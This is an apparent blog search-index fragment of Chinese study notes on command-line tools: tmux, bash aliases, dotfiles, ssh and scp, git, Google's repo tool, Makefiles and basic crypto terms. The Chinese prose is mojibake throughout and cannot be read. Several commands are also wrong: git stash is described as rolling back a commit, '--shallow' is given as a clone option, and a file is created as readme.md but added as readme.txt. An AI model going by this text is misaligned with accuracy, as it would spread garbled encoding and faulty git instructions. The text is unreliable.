å…³é—­pune</span><br><span class="line">prefix %       ç«–ç›´åˆ‡å‰²</span><br><span class="line">prefix <span class="string">&quot;       æ°´å¹³åˆ‡å‰²</span></span><br><span class="line"><span class="string">prefix æ–¹å‘é”®   é€‰æ‹© pune</span></span><br><span class="line"><span class="string">prefix x       å…³é—­pune</span></span><br><span class="line"><span class="string">prefix z       æœ€å¤§åŒ–å½“å‰çª—å£ï¼Œåœ¨æŒ‰ä¸€æ¬¡é€€å‡º</span></span><br><span class="line"><span class="string">prefix !       åˆ†ç¦»pune è¿›å…¥window</span></span><br><span class="line"><span class="string">æŒç»­æŒ‰prefix æ–¹å‘é”®  æ”¹å˜puneå¤§å°</span></span><br></pre></td></tr></table></figure>

<p>é…ç½®å¿«æ·é”®ï¼Œ <code>~/.tmux.conf</code>ã€‚æˆ‘ä½¿ç”¨çš„æ˜¯åŸºäºç½‘ä¸Šæ‰¾çš„ <a href="https://www.debugpointer.com/linux/tmux-conf">tmux-conf</a>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl-b è·ç¦»éå¸¸æœ‰ç‚¹é˜´é—´ï¼Œå› æ­¤éœ€è¦æ”¹ã€‚ctrl-a æ˜¯qemuå¿«æ·é”®ã€‚å› æ­¤é€‰æ‹©ctrl-x</span><br><span class="line"></span><br><span class="line">prefix I             install plugins</span><br><span class="line">prefix alt I         uninstall</span><br><span class="line"></span><br><span class="line">alt + æ–¹å‘é”®ï¼Œpune ç§»åŠ¨</span><br></pre></td></tr></table></figure>

<ul>
<li>æ’ä»¶ç®¡ç† <a href="https://github.com/tmux-plugins/tpm">Tmux Plugin Manager</a></li>
<li>ç¾åŒ–+å¿«æ·é”® ç³»åˆ—æ“ä½œå‚è€ƒã€‚<a href="https://github.com/rothgar/awesome-tmux#themes">awesome-tmux: A list of awesome resources for tmux</a></li>
</ul>
<h3 id="aliases"><a href="#aliases" class="headerlink" title="aliases"></a>aliases</h3><p>ç»™å¸¸ç”¨çš„å‘½ä»¤è®¾ç½®åˆ«å </p>
<ul>
<li>bash çš„<code>~/.bashrc</code> æ–‡ä»¶</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ³¨æ„ï¼Œä¸è¦å­˜åœ¨ ll = &#x27;ls -l&#x27; å› ä¸ºåœ¨shell scriptä¸­ï¼Œç©ºæ ¼æ˜¯æœ‰æ„ä¹‰çš„</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br></pre></td></tr></table></figure>


<h3 id="dotfiles"><a href="#dotfiles" class="headerlink" title="dotfiles"></a>dotfiles</h3><p>å„ç§é…ç½®æ–‡ä»¶ã€‚å¤§éƒ¨åˆ†æ˜¯æ–‡ä»¶</p>
<ul>
<li>bash -&gt; <code>~/.bashrc</code></li>
<li>zsh -&gt; <code>~/.zshrc</code>ã€‚æˆ‘ä»¬çš„zshç¾åŒ–ä¹Ÿæ˜¯ä¿®æ”¹æ­¤æ–‡ä»¶ã€‚</li>
<li>vim -&gt; <code>~/.vimrc</code></li>
<li>tmux -&gt; <code>~/tmux.conf</code></li>
<li>neovim -&gt; <code>~/.config/nvim</code> ç›®å½•ä¸‹çš„ <code>åŸºäºlua</code> é…ç½®</li>
<li>ssh -&gt; <code>~/.ssh</code> è¿™æ˜¯ä¸€ä¸ªç›®å½•ã€‚å¯ä»¥é…ç½®å…¬ç§é’¥ï¼Œå…å¯†ç™»å½•ã€‚<ul>
<li>è‡ªå·±çš„æœºå™¨ <code>ssh-keygen</code> å‘½ä»¤ç”Ÿæˆå…¬ç§é’¥</li>
<li>å°†å…¬é’¥æ”¾å…¥æœåŠ¡å™¨çš„ <code>authorized_keys</code>ã€‚æƒé™ä¸€èˆ¬æ˜¯<code>600</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pubÂ  &lt;username&gt;@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸¸ç”¨çš„ssh ä¼ è¾“æ–‡ä»¶ scp  å’Œcpå‘½ä»¤å·®ä¸å¤šï¼Œç»™å‡ºè·¯å¾„</span></span><br><span class="line">scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp</span><br></pre></td></tr></table></figure>

<p>æ„Ÿå…´è¶£çš„å¯ä»¥å­¦ä¹ ä¸€ä¸‹ <a href="https://nixos.org/">NixOS</a>, ä¸€ä¸ªåŸºäºé…ç½®æ–‡ä»¶çš„æ“ä½œç³»ç»ŸğŸ˜‹</p>
<p>å¤§éƒ¨åˆ†é…ç½®éƒ½å¯åœ¨ github æŸ¥æ‰¾åˆ°ï¼Œå¦‚æœä¸æƒ³è‡ªå·±é…ç½®ï¼Œç›´æ¥ <code>clone/fork</code> ä¸€ä¸ªå…¶ä»–äººçš„ã€‚</p>
<p>bash å‰é¢çš„ä¸€ä¸²çš„ä¿®æ”¹ </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS1=<span class="string">&quot;user&gt;&quot;</span>   æˆ‘ä»¬shell å‰é¢çš„ä¸€ä¸²</span><br></pre></td></tr></table></figure>

<blockquote>
<p>é—®é¢˜ï¼šå¦‚ä½•åœ¨æœ¬æœºå’ŒæœåŠ¡å™¨åŒæ—¶ä½¿ç”¨tmux</p>
</blockquote>
<p>ç›¸åŒçš„é…ç½®ä¼šå¯èƒ½äº§ç”Ÿå†²çªï¼Œæˆ–è€…ä¼šä½¿æˆ‘ä»¬ä¸çŸ¥é“æ“ä½œçš„æ˜¯å“ªä¸€ä¸ªï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸åŒçš„é…ç½®æ–‡ä»¶ã€‚æœ€ç®€å•çš„å°±æ˜¯ä½¿ç”¨ä¸¤ä¸ª <code>prefix</code> ã€‚</p>
<h2 id="lecture6-virsion-control-git"><a href="#lecture6-virsion-control-git" class="headerlink" title="lecture6: virsion control(git)"></a>lecture6: virsion control(git)</h2><blockquote>
<p>gitç‰ˆæœ¬æ§åˆ¶</p>
</blockquote>
<p>å¼€å‘é¡¹ç›®ï¼Œå›¢é˜Ÿåˆä½œï¼Œæ–‡ä»¶æŸåçš„å›é€€ã€‚ã€‚ã€‚gitéƒ½å¯ä»¥åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå¸®åŠ©æˆ‘ä»¬ï¼Œä¸éœ€è¦åˆ é™¤åœ¨é‡æ–°ä¸‹è½½ğŸ˜˜</p>
<ul>
<li>git æŠ½è±¡å»ºæ¨¡ã€‚ä½¿ç”¨æœ‰å‘æ— ç¯å›¾è¿›è¡ŒæŠ½è±¡<ul>
<li>é¡¶å±‚rootï¼Œæ–‡ä»¶å¤¹æŠ½è±¡ä¸º<code>tree</code>, æ–‡ä»¶æŠ½è±¡ä¸º<code>blob</code></li>
<li>commit: æ¯æ¬¡commit äº§ç”Ÿä¸€ä¸ªç±»ä¼¼ <code>snapshot(å¿«ç…§)</code>çš„ä¸œè¥¿ï¼Œä¿å­˜å½“å‰çš„çŠ¶æ€ä»¥åŠä¸€äº›ä¿¡æ¯(ä½œè€…ï¼Œæè¿°â€¦)ã€‚</li>
<li>é€šè¿‡ <code>mapping&lt;string, object&gt;</code> è¿›è¡Œç®¡ç†.stringæŒ‡æ–‡ä»¶çš„å“ˆå¸Œå€¼(SHA-1)ï¼Œobjectæ˜¯æˆ‘ä»¬æ–‡ä»¶ä¿å­˜çš„åœ°å€(â€˜snapshotâ€™åœ¨ç£ç›˜ä¸­çš„åœ°å€)ã€‚æ¯æ¬¡ä¿®æ”¹ï¼Œcommitä¼šäº§ç”Ÿæ–°çš„hash</li>
</ul>
</li>
<li>reference: gitéœ€è¦çš„æ˜¯æ–‡ä»¶çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºäººç±»æ¯«æ— æ„ä¹‰ï¼Œå› æ­¤å­˜åœ¨å¦ä¸€ä¸ª <code>mapping&lt;string, string&gt;</code> ã€‚æˆ‘ä»¬ä½¿ç”¨å¯ä»¥äººç±»æ–¹ä¾¿é˜…è¯»çš„å­—ç¬¦ä¸²ï¼Œæ˜ å°„åˆ°hashï¼Œç„¶ååœ¨å¯»æ‰¾åˆ°æ–‡ä»¶</li>
<li>git å‡ ä¸ªçŠ¶æ€ï¼Œå¯ä»¥çœ‹çœ‹ <a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.337.search-card.all.click&vd_source=ccaa27461534d3a4a5e9b964672f86d6">Gitå·¥ä½œæµå’Œæ ¸å¿ƒåŸç†</a>ï¼Œéå¸¸æœ‰è¶£ã€‚åœ¨å­¦ä¹ æ—¶ï¼Œå¯ä»¥æƒ³è±¡ä¸€ä¸‹æœ‰å‘æ— ç¯å›¾è¿›è¡Œç†è§£ã€‚<ul>
<li>å·¥ä½œåŒº</li>
<li>æš‚å­˜åŒº</li>
<li>æœ¬åœ°ä»“åº“</li>
<li>è¿œç¨‹ä»“åº“</li>
</ul>
</li>
</ul>
<p>git çš„é…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é…ç½®ç”¨æˆ·åï¼Œé‚®ç®±ã€‚è‡ªå·±çš„è´¦æˆ·ã€‚</span></span><br><span class="line">git config --global user.name <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your email&quot;</span></span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªgitä»“åº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"></span><br><span class="line">git init   <span class="comment"># æœ¬åœ°ä»“åº“åˆå§‹åŒ–ï¼Œå‡ºç°ä¸€ä¸ª `.git` çš„ç›®å½•</span></span><br><span class="line"></span><br><span class="line">git status <span class="comment"># æŸ¥çœ‹ä»“åº“çŠ¶æ€ï¼Œéå¸¸å¸¸ç”¨</span></span><br></pre></td></tr></table></figure>

<p>æ—¥å¿—ï¼ŒæŸ¥çœ‹æäº¤çš„æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># oneline å»é™¤ä¸€å®šçš„ä¿¡æ¯</span></span><br><span class="line">git <span class="built_in">log</span> --all --graph --decorate --oneline</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å­˜åœ¨ä¸€ä¸ª <code>HEAD</code> æŒ‡é’ˆæŒ‡å‘å½“å‰å·¥ä½œçš„åˆ†æ”¯ã€‚</p>
<p>æˆ‘ä»¬æƒ³å¿½ç•¥æŸäº›æ–‡ä»¶æ—¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ gitignore æ–‡ä»¶é…ç½®</span></span><br><span class="line"><span class="built_in">touch</span> .gitignore</span><br><span class="line"></span><br><span class="line">*.jpg   <span class="comment"># å¿½ç•¥æ‰€æœ‰çš„ jpgæ–‡ä»¶</span></span><br></pre></td></tr></table></figure>
<p>æœ¬åœ°æ“ä½œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="comment"># å†™ç‚¹æ–°æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; readme.md  <span class="comment"># å¤„äºuntracked çŠ¶æ€ï¼Œä½¿ç”¨git status ä¼šå­˜åœ¨æç¤º</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æš‚å­˜åŒº</span></span><br><span class="line">git add readme.txt       <span class="comment"># å¤„äºtracked çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æäº¤åˆ°æœ¬åœ°ä»“åº“</span></span><br><span class="line">git commit  <span class="comment"># è¿›å…¥æ–‡ä»¶ï¼Œè¿›è¡Œæè¿°ä¿®æ”¹çš„å†…å®¹</span></span><br><span class="line">	-m <span class="string">&quot;message&quot;</span>  <span class="comment"># message ä»£è¡¨æè¿°ï¼Œç®€çŸ­æè¿°å¯ä»¥è¿™æ ·ä½¿ç”¨</span></span><br></pre></td></tr></table></figure>


<p>æäº¤åˆ°è¿œç¨‹ä»£ç ä»“åº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. è¿œç¨‹åˆ›å»ºåç›´æ¥cloneä¸‹æ¥ï¼Œç„¶åå†å†™å†…å®¹</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="string">&quot;your-repo&quot;</span></span><br><span class="line">git remote -v   <span class="comment"># æŸ¥çœ‹å’Œé‚£äº›ä»“åº“æœ‰è”ç³»</span></span><br><span class="line">git push        <span class="comment"># æœ‰.gitæ–‡ä»¶å¤¹ï¼Œå¯ä»¥æ‰¾åˆ°ä»“åº“æäº¤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æˆ‘ä»¬åœ¨æœ¬åœ°å†™äº†å¾ˆå¤šæ–‡ä»¶ï¼Œä½†æ˜¯ä¸­é€”æƒ³èµ·æ¥æ²¡æœ‰ä½¿ç”¨gitï¼Œæˆ‘ä»¬å¦‚ä½•åšï¼Ÿ</span></span><br><span class="line"><span class="comment">## è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»ºä»“åº“</span></span><br><span class="line"><span class="comment">## ç„¶åå†æœ¬åœ°</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit</span><br><span class="line">git remote add <span class="string">&quot;name&quot;</span> git@&lt;your-repo&gt;  <span class="comment"># å…³è”è¿œç¨‹ä»“åº“ã€‚</span></span><br><span class="line">							<span class="comment"># name è‡ªå·±å–ï¼Œå¯ä»¥å…³è”å¾ˆå¤šä»“åº“ï¼Œæ ¹æ®åå­—åŒºåˆ†</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## ä½†æ˜¯æœ¬åœ°ä»“åº“ä¸€èˆ¬æ˜¯masterï¼ŒæŸäº›å¹³å°æ˜¯main(ä¹Ÿå¯ä»¥é€‰ï¼Œä½†æ˜¯é»˜è®¤æ˜¯main)ï¼Œè¿™ä¸€æ­¥å¯èƒ½å‡ºé”™ï¼Œéœ€è¦åˆ‡æ¢åˆ†æ”¯ `git checkout -b main`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## è¿œç¨‹åˆ†æ”¯ä¸å­˜åœ¨ä¼šåˆ›å»ºä¸€ä¸ª</span></span><br><span class="line">git push <span class="string">&quot;ä»“åº“åç§°&quot;</span> <span class="string">&quot;æœ¬åœ°åˆ†æ”¯å&quot;</span>:<span class="string">&quot;è¿œç¨‹åˆ†æ”¯å&quot;</span>   <span class="comment"># å¦‚æœæœ¬åœ°åˆ†æ”¯åä¸è¿œç¨‹åˆ†æ”¯åç›¸åŒï¼Œåˆ™å¯ä»¥çœç•¥å†’å·</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## åˆ é™¤è¿œç¨‹ä»“åº“</span></span><br><span class="line">git remote <span class="built_in">rm</span> <span class="string">&quot;ä»“åº“å&quot;</span></span><br></pre></td></tr></table></figure>


<p>ä»è¿œç¨‹ä»“åº“åˆ°å·¥ä½œåŒºã€‚æ¯”å¦‚å›¢é˜Ÿåˆä½œä¸­ï¼Œè¿œç¨‹ä»“åº“æ›´æ–°äº†ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåŒæ­¥ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç›´æ¥åŒæ­¥åˆ°æœ¬åœ°ï¼Œä¼šç›´æ¥æ›´æ–°æœ¬åœ°æ–‡ä»¶</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”±äºpull ä¸€æ­¥åˆ°ä½ï¼Œä¹Ÿå¯åˆ†æ­¥è¿›è¡Œ</span></span><br><span class="line"><span class="comment">## å…ˆæ›´æ–°åˆ°åˆ°æœ¬åœ°ä»“åº“</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment">## diff å¯¹æ¯”åŒºåˆ«</span></span><br><span class="line">git diff </span><br><span class="line">    <span class="comment"># æŸ¥çœ‹æœ¬åœ°ä»“åº“å’Œå·¥ä½œåŒºçš„åŒºåˆ«</span></span><br><span class="line"><span class="comment">## pull åˆå¹¶ = git fetch + git merge</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>


<p>åˆ†æ”¯æ“ä½œã€‚æˆ‘ä»¬å‚ä¸å¼€æºé¡¹ç›®æ—¶ï¼Œå»ºè®®åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯pushï¼Œç”±é¡¹ç›®è´Ÿè´£äººå†³å®šæ˜¯å¦åˆå¹¶(merge)ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch <span class="string">&quot;name&quot;</span>  <span class="comment"># åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ </span></span><br><span class="line">		-vv   <span class="comment"># æŸ¥çœ‹åˆ†æ”¯ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">git checkout <span class="string">&quot;name&quot;</span>  <span class="comment"># åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="line">		-d <span class="string">&quot;name&quot;</span>    <span class="comment"># åˆ é™¤åˆ†æ”¯</span></span><br><span class="line">		-D <span class="string">&quot;name&quot;</span>    <span class="comment"># æš´åŠ›åˆ é™¤</span></span><br><span class="line">		-b <span class="string">&quot;name&quot;</span>    <span class="comment"># åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ç„¶ååˆ‡æ¢</span></span><br><span class="line"></span><br><span class="line">git merge      <span class="comment"># å°†åˆ«çš„åˆ†æ”¯åˆå¹¶åˆ° `å½“å‰åˆ†æ”¯` ä¸­</span></span><br><span class="line">		<span class="comment"># å¯èƒ½ä¼šå­˜åœ¨å†²çªï¼Œåœ¨æŸä¸€ä¸ªç›¸åŒçš„ä½ç½®å­˜åœ¨ä¸åŒçš„å†…å®¹.ä¿å­˜çš„è¯ï¼Œè‡ªå·±å†³å®šç„¶åä¿®æ”¹å†²çªæ–‡ä»¶å°±è¡Œ</span></span><br></pre></td></tr></table></figure>


<p>git clone ä¼šå¤åˆ¶è¿œç¨‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…å«å…¶æ‰€æœ‰çš„ <code>snapshot</code> æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>--shallow</code> å¿½ç•¥è¿™äº›</p>
<p>git å›æ»šï¼šå½“æˆ‘ä»¬åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸­<code>commit</code>åå‘ç°ä¸€ä¸ªå·¨å¤§çš„é”™è¯¯ï¼Œéœ€è¦å›é€€åˆ°ä¹‹å‰çš„ç‰ˆæœ¬ã€‚æ”¹å˜ <code>HEAD</code> æŒ‡é’ˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git stash   <span class="comment"># å›é€€åˆ°ä¸Šä¸€ä¸ªcommit ç‰ˆæœ¬</span></span><br><span class="line">git bisect  <span class="comment"># æ¯”è¾ƒå¼ºå¤§çš„å·¥å…·</span></span><br><span class="line"></span><br><span class="line">git reset </span><br><span class="line">		--hard         <span class="comment"># ä¼šä¸¢å¤±æœ€æ–°çš„ä»£ç ä¿®æ”¹</span></span><br><span class="line">		--soft         <span class="comment"># å°† HEAD æŒ‡é’ˆå›é€€åˆ°æŒ‡å®šæäº¤ï¼Œä¸æ”¹å˜æš‚å­˜åŒºå’Œå·¥ä½œåŒºçš„å†…å®¹</span></span><br><span class="line">		</span><br><span class="line">			HEAD^       <span class="comment"># ä¸Šä¸€ä¸ª ç‰ˆæœ¬</span></span><br><span class="line">			HEAD~&lt;num&gt;  <span class="comment"># å›é€€numä¸ªç‰ˆæœ¬</span></span><br><span class="line">			&lt;<span class="built_in">hash</span>&gt;      <span class="comment"># å›é€€åˆ°æŒ‡å®šå“ˆå¸Œå€¼çš„ç‰ˆæœ¬</span></span><br><span class="line"></span><br><span class="line">git revert -n <span class="built_in">hash</span>   <span class="comment"># å°†ç‰ˆæœ¬å¤åˆ¶ä¸€ä»½ï¼Œä¸ä¼šé”€æ¯</span></span><br></pre></td></tr></table></figure>


<p>ç°åœ¨çš„IDEä¸­å­˜åœ¨gitç›¸å…³çš„å·¥å…·ï¼Œä¹Ÿæ›´åŠ æ–¹ä¾¿äº†æˆ‘ä»¬çš„ä½¿ç”¨ã€‚</p>
<p>ä¹Ÿå­˜åœ¨å…¶ä½™çš„ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼Œsvn, repoâ€¦â€¦</p>
<h3 id="repo-ä½¿ç”¨"><a href="#repo-ä½¿ç”¨" class="headerlink" title="repo ä½¿ç”¨"></a>repo ä½¿ç”¨</h3><p><a href="https://source.android.google.cn/docs/setup/create/repo?hl=zh-cn#start">repo</a> æ›´é€‚åˆå¤šä¸ªä»“åº“çš„ç®¡ç†ï¼Œå¹³å¸¸æˆ‘ä»¬è§çš„é¡¹ç›®éƒ½æ˜¯ä¸€ä¸ªä»“åº“ã€‚ä½†æ˜¯å‘Androidè¿™æ ·çš„ä¾èµ–ä¸Šç™¾ä¸ªgitä»“åº“æ¥è¯´ï¼Œä¾é gitå¹¶ä¸æ˜¯å¤šä¹ˆå¥½ä½¿ç”¨ï¼Œå› æ­¤google å¼€å‘äº†repoå·¥å…·ï¼Œæœ¬è´¨æ˜¯ä¸€ä¸ªpythonè„šæœ¬ï¼ŒåŸºäºgitã€‚</p>
<p>åˆå§‹åŒ–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo init</span><br><span class="line">	-u git@&lt;repo&gt;/mainfest.git  <span class="comment"># é»˜è®¤ä¸ºgoogleçš„ä»“åº“ https://gerrit.googlesource.com/git-repo</span></span><br><span class="line">								<span class="comment"># è¿™ä¸ªç›®å½•ä¸‹æœ€ç®€å•åªéœ€è¦ default.xml</span></span><br><span class="line">	-b  <span class="comment"># æŒ‡å®šbranch</span></span><br></pre></td></tr></table></figure>

<p> -uåçš„ä»“åº“, xmlæ–‡ä»¶(é»˜è®¤<code>default.xml</code>, æˆ‘ä»¬å¯ä»¥è‡ªå·±é€‰æ‹©)ï¼Œç„¶åæˆ‘ä»¬æ‹‰å–çš„æ—¶å€™ä¼šå°†æ‰€æœ‰çš„gitä»“åº“æ‹‰å–ä¸‹æ¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo init -u &lt;repo&gt;</span><br><span class="line">	-m æŒ‡å®šxmlæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>æ‹‰å–ä»£ç åˆ°æœ¬åœ°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> -c</span><br></pre></td></tr></table></figure>

<p>åˆ†æ”¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo branch  <span class="comment"># æŸ¥çœ‹åˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line">repo start &lt;branch_name&gt; --all <span class="comment"># åˆ›å»ºåˆ†æ”¯å¹¶è¿›å…¥</span></span><br></pre></td></tr></table></figure>

<h2 id="lecture7-debugging-profiling"><a href="#lecture7-debugging-profiling" class="headerlink" title="lecture7: debugging &amp; profiling"></a>lecture7: debugging &amp; profiling</h2><blockquote>
<p>è°ƒè¯•ç¨‹åºä»¥åŠæ€§èƒ½åˆ†æ</p>
</blockquote>
<p>æŸ¥çœ‹æ—¥å¿—ï¼Œæ‰“å°æ—¥å¿—ï¼Œåˆ¶ä½œæ—¥å¿—</p>
<p>è°ƒè¯•å™¨</p>
<ul>
<li>GNU gdbï¼Œå¯ä»¥è°ƒè¯•å‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶ç¨‹åº</li>
<li>python pdbï¼Œpythonè°ƒè¯•</li>
<li>æµè§ˆå™¨è°ƒè¯•js</li>
</ul>
<p>æ€§èƒ½æµ‹è¯•</p>
<ul>
<li>æµ‹è¯•ä¸€ä¸ªç¨‹åºè¿è¡Œ time</li>
</ul>
<h2 id="lecture8-metaprogramming"><a href="#lecture8-metaprogramming" class="headerlink" title="lecture8: metaprogramming"></a>lecture8: metaprogramming</h2><p>å¦‚ä½•æ›´é«˜çš„ç®¡ç†é¡¹ç›®ã€æµ‹è¯•ã€ä¾èµ–ç®¡ç†ã€‚ä½¿ç”¨ <code>makefile</code></p>
<p>Makefile çš„ä½¿ç”¨æ¯”è¾ƒç®€å•ã€‚</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">ç›®æ ‡: ä¾èµ–</span></span><br><span class="line">	å‘½ä»¤  //å‰é¢å¿…é¡»æ˜¯tabé”®</span><br><span class="line"></span><br><span class="line"><span class="section">main: main.c</span></span><br><span class="line">	gcc main.c -o mian</span><br></pre></td></tr></table></figure>

<p>ä¸€äº›è¯­æ³•</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$^</span>   æ‰€æœ‰çš„ä¾èµ–é¡¹</span><br><span class="line"><span class="variable">$&lt;</span>   ä¸€ä¸ªä¾èµ–é¡¹</span><br><span class="line"><span class="variable">$@</span>   ç›®æ ‡æ–‡ä»¶</span><br><span class="line">echo æ‰“å°</span><br><span class="line">%    é€šé…ç¬¦</span><br><span class="line">*    ä¹Ÿæ˜¯é€šé…ç¬¦</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ç¼–è¯‘æŸäº›å¼€æºé¡¹ç›®æ—¶ä¹Ÿä¼šä½¿ç”¨ <code>make</code> å‘½ä»¤ï¼Œå¯ä»¥çœ‹çœ‹åˆ«äººæ€ä¹ˆå†™çš„ã€‚</p>
<p>å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–çš„é€‰æ‹©ï¼Œæ¯”å¦‚ <code>cmake</code></p>
<h2 id="lecture9-security-crypto"><a href="#lecture9-security-crypto" class="headerlink" title="lecture9: security &amp; crypto"></a>lecture9: security &amp; crypto</h2><blockquote>
<p>å®‰å…¨å¾ˆå¤šï¼Œä¹Ÿæ˜¯ä¸€é—¨ä¸“é—¨çš„å­¦ç§‘ï¼Œæƒ³è¦æ·±å…¥å°±éœ€è¦å­¦ä¸“ä¸šè¯¾</p>
</blockquote>
<p>hash: ç”¨ä½œä¿¡æ¯æ‘˜è¦ï¼Œç­¾åï¼Œæ£€æŸ¥æ–‡ä»¶çš„å®Œæ•´æ€§ã€‚</p>
<ul>
<li>md5</li>
<li>sha-1&#x2F;2&#x2F;3</li>
</ul>
<p>å¯¹ç§°åŠ å¯†</p>
<ul>
<li>DES</li>
<li>AES</li>
</ul>
<p>éå¯¹ç§°åŠ å¯†</p>
<ul>
<li>RSA</li>
<li>ECC</li>
</ul>
<p>æ•°å­—ç­¾å</p>
<h2 id="lecture10-potpourri"><a href="#lecture10-potpourri" class="headerlink" title="lecture10: potpourri"></a>lecture10: potpourri</h2><blockquote>
<p>å¤§æ‚çƒ©ï¼šè®²è¿°ä¸€äº›æ¦‚å¿µï¼Œç†Ÿç»ƒè¿˜å¾—åœ¨ä»¥åå¤šç»ƒä¹ </p>
</blockquote>
<p>é”®ç›˜æ˜ å°„</p>
<ul>
<li>é”®ç›˜ä¸Šçš„<code>Caps Lock</code>å‡ ä¹ä¸æ€ä¹ˆä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°é…ç½®ä¸€ä¸‹(æ¯”å¦‚æ¯”è¾ƒå°çš„Esc)ï¼Œè®©å…¶å‘æŒ¥ä½œç”¨</li>
<li>windowså¯ä»¥ä½¿ç”¨powertoy</li>
</ul>
<p>å®ˆæŠ¤è¿›ç¨‹ï¼Œdaemon</p>
<p>å‘½ä»¤è¡Œå‚æ•°</p>
<ul>
<li>æˆ‘ä»¬ä½¿ç”¨çš„å‘½ä»¤å¯ä»¥å¸¦æœ‰å‚æ•°</li>
</ul>
<p>Window Manage</p>
<p>VPN</p>
<p>Jupyter Notebook: äº¤äº’å¼ç¼–ç¨‹</p>
<p>GitHub: ä»£ç æ‰˜ç®¡å¹³å°</p>
<ul>
<li>åˆ›å»ºè‡ªå·±çš„ä»“åº“</li>
<li>æissueï¼Œè§£å†³é—®é¢˜</li>
<li>pr: pull requestï¼Œè‡ªå·±å†™çš„æäº¤ç»™ä½œè€…</li>
<li>merge åˆ«äººçš„è¯·æ±‚</li>
</ul>
<h2 id="lecture11-Q-A"><a href="#lecture11-Q-A" class="headerlink" title="lecture11: Q&amp;A"></a>lecture11: Q&amp;A</h2><blockquote>
<p>æ¥è‡ªå­¦ç”Ÿçš„é—®é¢˜</p>
</blockquote>
<p>å¦‚ä½•è¿›è¡Œæ“ä½œç³»ç»Ÿçš„å­¦ä¹ ï¼Ÿ</p>
<ul>
<li>learn by exercise: å­¦ä¹ æ¯”è¾ƒå‡ºåçš„ OS è¯¾ç¨‹ï¼Œå®Œæˆç›¸åº”çš„labï¼Œå®ç°è‡ªå·±çš„OS</li>
</ul>
<p>â€¦â€¦ è‡ªå·±çœ‹</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>vim</tag>
        <tag>terminal</tag>
      </tags>
  </entry>
</search>
